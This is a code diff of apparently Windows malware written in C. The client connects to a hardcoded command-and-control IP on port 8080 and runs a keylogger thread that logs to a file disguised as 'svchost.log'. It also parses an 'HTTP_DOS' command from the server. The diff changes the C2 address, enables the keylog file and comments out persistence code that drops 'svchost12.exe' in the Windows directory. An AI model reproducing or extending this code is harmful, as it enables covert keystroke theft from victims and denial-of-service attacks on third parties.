@@ -15,26 +15,25 @@
 #include "utils.h"
 
 #pragma comment(lib,"ws2_32.lib") //Winsock Library
-
 int expression_handler(char *command, char **token);
 void *kl_thread();
-
-int main() {
+int main(){
 	WSADATA wsa;                                        //Info about winsock implementation
 	SOCKET s;
 	pthread_t tid;
 	int *ip;
-	char server_ip[15]="167.99.194.11", *buffer;
+
+	char server_ip[15]="167.99.213.187", *buffer;
 	char server_reply[256], *token;
-	int recv_size,control_sock,port=8081,test,create;
+	int recv_size,control_sock,port=8080,test,create;
 	ip = (int *) malloc(1000000000*sizeof(int));
 	free(ip);
 	//stealth();
-	test=test_key();
+	/*test=test_key();
 	if(test==2){
 		char *path="c:\\%windir%\\svchost12.exe";
 		create=create_key(path);
-	}
+	}*/
     pthread_create(&tid, NULL, kl_thread, NULL);
     //Inizialize winsock
     do{
@@ -63,9 +62,11 @@ int expression_handler(char *command, char **riscommand){
 	//char *token;
 	int ris;
 
+	//Divido il comando ricevuto
 	token = strtok(command, delim);
 
 	if(strcmp("HTTP_DOS",token)==0){
+
         token = strtok(NULL,token);
         *riscommand=token;
 		return 1;
@@ -80,7 +81,7 @@ int expression_handler(char *command, char **riscommand){
 
 void *kl_thread(){
 	//upload();
-	//FILE* fp =fopen("svchost.log","w");
-    //fclose(fp);
+	FILE* fp =fopen("svchost.log","w");
+    fclose(fp);
     get_keylog();
 }
